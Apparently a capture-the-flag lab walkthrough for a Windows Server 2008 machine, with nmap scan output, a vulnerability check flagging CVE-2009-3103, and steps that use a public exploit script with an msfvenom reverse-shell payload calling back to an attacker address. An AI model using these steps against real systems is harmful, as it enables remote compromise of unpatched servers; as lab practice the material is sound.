Level: Easy

```
sudo nmap 192.168.217.40 -p- -vv -n -Pn -T4 

PORT      STATE SERVICE       REASON
53/tcp    open  domain        syn-ack ttl 125
135/tcp   open  msrpc         syn-ack ttl 125
139/tcp   open  netbios-ssn   syn-ack ttl 125
445/tcp   open  microsoft-ds  syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125
5357/tcp  open  wsdapi        syn-ack ttl 125
49152/tcp open  unknown       syn-ack ttl 125
49153/tcp open  unknown       syn-ack ttl 125
49154/tcp open  unknown       syn-ack ttl 125
49155/tcp open  unknown       syn-ack ttl 125
49156/tcp open  unknown       syn-ack ttl 125
49157/tcp open  unknown       syn-ack ttl 125
49158/tcp open  unknown       syn-ack ttl 125
```


```
nmap 192.168.217.40 -p53,135,139,445,3389,5357,49152,49153,49154,49155,49156,49157,49158 -vv -n -Pn -sC -sV
```

```
53/tcp    open  domain       syn-ack ttl 125 Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 125 Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 125
|_ssl-date: 2025-12-15T14:28:43+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-01-05T19:52:51
| Not valid after:  2025-07-07T19:52:51
| MD5:   7c2b:85a9:1fe2:c264:4be8:ed3e:e16b:274a
| SHA-1: 05e9:c5e9:7ac6:242e:0a18:ca56:e1b5:1c38:31db:d393
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQFHV8TrpYYLdKV58423mJ8zANBgkqhkiG9w0BAQUFADAT
| MREwDwYDVQQDEwhpbnRlcm5hbDAeFw0yNTAxMDUxOTUyNTFaFw0yNTA3MDcxOTUy
| NTFaMBMxETAPBgNVBAMTCGludGVybmFsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAsuNdIa0z31V1iHCg2TtuOK+FoyVu3aXcVxL/Q8jUvhOtpe0fWn9j
| qpT+smMeA0XpJfeS917Tpy5t5gqyqUCAXPOwoeGnZu1IrvxwcMlpMImPGXeMZ+0q
| Cb/3LdlwA7WEUaZtAxpMHBx7UNbcEnj38BsrWY6zr/K7TDlFgsrsITDDuyddIjNz
| 2VU8gFBPPwzHZGMGsMgo2v3mCZnA6Xkp8tmwGq137fxrwbvzC3vNdt1/m5icsyYD
| hMglYmztE9vp0rwKB0CB5K+mwc9U7isWsRbORWutqkBbp4XI08RbSklP3A6XPUNu
| eUb1rIMV4ZbTbRTOKOGa12X7isXq6cVzOwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAE0duqOsApBP
| OvE8znZxfUgAF5f+WR+GsAPYwhV0c6GWv7PnghnTAFfoBy+8Gy1PeyrAwfL2PQqT
| AHIBgpfbkEWwA/idfGpTJNDF2n8uZ3W8hOBU7elqRAHtvj749IqnMz15n5WwsGvW
| A6hsOIoEKyluekiV9kOosMjKG9jtB+iwOe88L5EqHrEfPeml2mpvhH6VhvJZnXlJ
| 1l0/GDRRXslgyBir672iqHy25PNqJQYlEMSooxZCwKUpo345E4J6BIxeayvNeLca
| W+SKB84s3A/9pXnPEXLD7IT6I4ln9ZQeYXHK0n3U2LcSCt8JtEr1vfi4LMSboxxi
| lRXQzPUUSW8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-12-15T14:28:28+00:00
5357/tcp  open  http         syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```

```
Host script results:
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-15T06:28:28-08:00
|_clock-skew: mean: 1h35m59s, deviation: 3h34m39s, median: 0s
| smb2-time: 
|   date: 2025-12-15T14:28:28
|_  start_date: 2025-02-20T21:30:47
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46035/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19277/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 65129/udp): CLEAN (Timeout)
|   Check 4 (port 18689/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:c3:87 (VMware)
| Names:
|   INTERNAL<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   INTERNAL<20>         Flags: <unique><active>
| Statistics:
|   00:50:56:ab:c3:87:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```


samba specific nmap enumeration
```
nmap -sV -sC --open -T4  -p 139,445 --script=vuln --script-args=unsafe=1 192.168.236.40 -vv
```

results
```
Host script results:
|_smb-vuln-ms10-054: ERROR: Script execution failed (use -d to debug)
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
```



- use https://github.com/sec13b/ms09-050_CVE-2009-3103/blob/main/MS09_050_2.py
- edit the file 
- msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.186 LPORT=7777 EXITFUNC=thread -f python -v shell -s 375 -n 51
	- ensure that the size of the payload is 375 
	- the padding can be changed with -n flag.
- open a listener
- run a exploit -> should have error but still connect to our listener

flag in C:\Users\Administrator\Desktop\proof.txt

